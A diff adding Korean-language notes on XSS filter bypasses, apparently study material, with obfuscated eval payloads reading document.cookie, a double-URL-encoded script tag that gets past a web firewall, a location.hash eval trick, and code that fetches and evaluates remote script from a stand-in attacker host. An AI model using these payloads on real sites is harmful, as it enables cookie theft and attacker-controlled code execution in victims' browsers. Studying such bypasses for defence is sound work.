@@ -98,6 +98,35 @@ function XSSFilter(data){
   return true;
 }
 /*
-
+/alert/.source+[URL+[]][0][12]+/document.cookie/.source+[URL+[]][0][13] instanceof{[Symbol.hasInstance]:eval};
+location=/javascript:/.source + /alert/.source + [URL+0][0][12] + /document.cookie/.source + [URL+0][0][13];
 */
+```
+
+
+# 디코딩 전 필터링
+웹 방화벽 검증 이후 다시 디코딩할 경우 공격자는 더블 URL 인코딩으로 웹 방화벽 검증 우회
+```
+POST /search?query=%253Cscript%253Ealert(document.cookie)%253C/script%253E HTTP/1.1
+...
+-----
+HTTP/1.1 200 OK
+<h1>Search results for: <script>alert(document.cookie)</script></h1>
+```
+
+# 길이 제한
+location.hash를 이용한 공격 방식
+```
+https://example.com/?q=<img onerror="eval(location.hash.slice(1))">#alert(document.cookie); 
+```
+
+외부 자원을 이용한 공격 방식
+```javascript
+import("http://malice.dreamhack.io");
+
+var e = document.createElement('script')
+e.src='http://malice.dreamhack.io';
+document.appendChild(e);
+
+fetch('http://malice.dreamhack.io').then(x=>eval(x.text()))
 ```
